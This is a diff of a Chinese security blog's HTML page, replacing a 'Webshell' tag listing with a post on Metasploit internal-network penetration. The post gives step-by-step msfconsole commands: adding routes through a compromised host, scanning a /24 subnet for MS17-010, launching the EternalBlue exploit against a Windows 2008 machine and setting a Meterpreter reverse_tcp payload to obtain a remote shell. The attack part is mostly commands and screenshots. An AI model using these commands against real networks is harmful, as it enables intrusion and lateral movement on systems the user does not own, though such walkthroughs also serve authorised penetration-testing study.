@@ -73,7 +73,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="内网渗透," />
 
 
 
@@ -86,16 +86,26 @@
 
 
 
-<meta name="description" content="一个喜欢分享的搬运工">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Hamal">
-<meta property="og:url" content="http://hamal.cc/tags/Webshell/index.html">
+<meta name="description" content="当我们拿到一个shell就想看看内网有多少机器，有兴趣的就进行内网渗透，">
+<meta name="keywords" content="内网渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="msf内网渗透（一）">
+<meta property="og:url" content="http://hamal.cc/2018/09/msf内网渗透（一）/index.html">
 <meta property="og:site_name" content="Hamal">
-<meta property="og:description" content="一个喜欢分享的搬运工">
+<meta property="og:description" content="当我们拿到一个shell就想看看内网有多少机器，有兴趣的就进行内网渗透，">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://hamal.cc/images/19.1.png">
+<meta property="og:image" content="http://hamal.cc/images/19.2.png">
+<meta property="og:image" content="http://hamal.cc/images/19.3.png">
+<meta property="og:image" content="http://hamal.cc/images/19.4.png">
+<meta property="og:image" content="http://hamal.cc/images/19.5.png">
+<meta property="og:image" content="http://hamal.cc/images/19.7.png">
+<meta property="og:image" content="http://hamal.cc/images/19.6.png">
+<meta property="og:updated_time" content="2018-09-25T14:43:41.790Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hamal">
-<meta name="twitter:description" content="一个喜欢分享的搬运工">
+<meta name="twitter:title" content="msf内网渗透（一）">
+<meta name="twitter:description" content="当我们拿到一个shell就想看看内网有多少机器，有兴趣的就进行内网渗透，">
+<meta name="twitter:image" content="http://hamal.cc/images/19.1.png">
 
 
 
@@ -125,7 +135,7 @@
 
 
 
-  <link rel="canonical" href="http://hamal.cc/tags/Webshell/"/>
+  <link rel="canonical" href="http://hamal.cc/2018/09/msf内网渗透（一）/"/>
 
 
 
@@ -133,7 +143,7 @@
 <!-- ��ҳ������ -->
 <script src="https://neveryu.github.io/js/src/pace.min.js"></script>
 
-  <title>标签: Webshell | Hamal</title>
+  <title>msf内网渗透（一） | Hamal</title>
   
 
 
@@ -152,7 +162,7 @@
     
   
 
-  <div class="container sidebar-position-right ">
+  <div class="container sidebar-position-right page-post-detail">
     <div class="headband"></div>
     
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -300,166 +310,241 @@
           <div id="content" class="content">
             
 
+  <div id="posts" class="posts-expand">
+    
+
+  
+
   
   
   
-  <div class="post-block tag">
-
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h2>Webshell<small>标签</small>
-        </h2>
-      </div>
-
-      
-        
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://hamal.cc/2018/09/msf内网渗透（一）/">
 
-      <h3 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="搬运工">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/logo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hamal">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2018/04/前台拿Webshell/" itemprop="url">
-              
-                <span itemprop="name">前台拿Webshell</span>
-              
-            </a>
         
-      </h3>
+          <h2 class="post-title" itemprop="name headline">msf内网渗透（一）</h2>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-04-24T22:30:30+08:00"
-              content="2018-04-24" >
-          04-24
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-25T21:46:34+08:00">
+                2018-09-25
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/内网渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">内网渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/09/msf内网渗透（一）/" class="leancloud_visitors" data-flag-title="msf内网渗透（一）">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+      		<span>℃</span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h3 class="post-title">
-        
-            <a class="post-title-link" href="/2018/04/Jboss反序列化漏洞批量验证/" itemprop="url">
-              
-                <span itemprop="name">Jboss反序列化漏洞批量验证</span>
-              
-            </a>
-        
-      </h3>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-04-20T10:06:48+08:00"
-              content="2018-04-20" >
-          04-20
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+      
 
       
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h3 class="post-title">
-        
-            <a class="post-title-link" href="/2018/04/Shodan批量自动化/" itemprop="url">
-              
-                <span itemprop="name">Shodan批量自动化</span>
-              
-            </a>
-        
-      </h3>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-04-16T21:51:24+08:00"
-              content="2018-04-16" >
-          04-16
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h3 class="post-title">
-        
-            <a class="post-title-link" href="/2018/03/网站的渗透测试思路/" itemprop="url">
-              
-                <span itemprop="name">网站的渗透测试思路</span>
-              
-            </a>
-        
-      </h3>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-03-10T13:15:05+08:00"
-              content="2018-03-10" >
-          03-10
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h3 class="post-title">
-        
-            <a class="post-title-link" href="/2018/02/拿Webshell小技巧/" itemprop="url">
-              
-                <span itemprop="name">拿Webshell小技巧</span>
-              
-            </a>
-        
-      </h3>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-02-24T19:52:43+08:00"
-              content="2018-02-24" >
-          02-24
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+        <p>当我们拿到一个shell就想看看内网有多少机器，有兴趣的就进行内网渗透，<strong><a id="more"></a></strong>这次我发现内网机子存在ms17_010漏洞，进行meterpreter内网渗透。</p>
+<h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>拿到内网的一个shell。<br><img src="/images/19.1.png" alt=""><br>我探查过是存在内网的，如果要内网扫描是要先添加路由的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets   //看内网路由</span><br><span class="line">run autoroute -s 192.168.1.0/24     //添加路由</span><br><span class="line">run autoroute -p     //看添加的路由</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/19.2.png" alt=""><br>调用扫描模块进行网络主机漏洞扫描。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">background    //退到后台</span><br><span class="line">use auxiliary/scanner/smb/smb_ms17_010     //调用扫描模块</span><br><span class="line">set rhosts 192.168.1.0/24     //全部内网机器</span><br><span class="line">set threads 20     //扫描线程</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/19.3.png" alt=""><br>发现有一台内网机器存在445漏洞，是Windows2008、64位。<br><img src="/images/19.4.png" alt=""></p>
+<h3 id="内网攻击"><a href="#内网攻击" class="headerlink" title="内网攻击"></a>内网攻击</h3><p>调用攻击模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue    //攻击模块</span><br><span class="line">show options    //看攻击模块选项</span><br><span class="line">set rhost 192.168.1.104     //设置存在漏洞的主机</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/19.5.png" alt=""><br>不知道为什么这次用<code>generic/shell_reverse_tcp</code>Payload攻击失败了，换了Payload才成功。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show payloads   //查看可用Payload</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp     //设置Payload</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/19.7.png" alt=""><br>成功获取到内网shell。<br><img src="/images/19.6.png" alt=""></p>
 
       
     </div>
+    
+    
+    
 
+    
+
+    <div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+  
+    </div>
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    搬运工
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://hamal.cc/2018/09/msf内网渗透（一）/" title="msf内网渗透（一）">http://hamal.cc/2018/09/msf内网渗透（一）/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="" rel="external nofollow" target="_blank"></a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/内网渗透/" rel="tag"># 内网渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/木马免杀免杀/" rel="next" title="木马免杀免杀">
+                <i class="fa fa-chevron-left"></i> 木马免杀免杀
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+<span class="jiathis_txt">分享到：</span>
+<a class="jiathis_button_fav">收藏夹</a>
+<a class="jiathis_button_copy">复制网址</a>
+<a class="jiathis_button_email">邮件</a>
+<a class="jiathis_button_weixin">微信</a>
+<a class="jiathis_button_qzone">QQ空间</a>
+<a class="jiathis_button_tqq">腾讯微博</a>
+<a class="jiathis_button_douban">豆瓣</a>
+<a class="jiathis_button_share">一键分享</a>
+
+<a href="http://www.jiathis.com/share?uid=2140465" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank">更多</a>
+<a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+var jiathis_config={
+  data_track_clickback:true,
+  summary:"",
+  shortUrl:false,
+  hideMore:false
+}
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+      
+    </div>
+  </div>
 
 
           </div>
@@ -467,6 +552,15 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zNjA1Mi8xMjU4Nw=="></div>
+    </div>
+
+  
+
+
 
         </div>
         
@@ -489,8 +583,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -627,6 +730,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#内网信息收集"><span class="nav-number">1.</span> <span class="nav-text">内网信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内网攻击"><span class="nav-number">2.</span> <span class="nav-text">内网攻击</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -780,6 +899,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
@@ -808,6 +931,17 @@
 
 
 
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
   
 
 
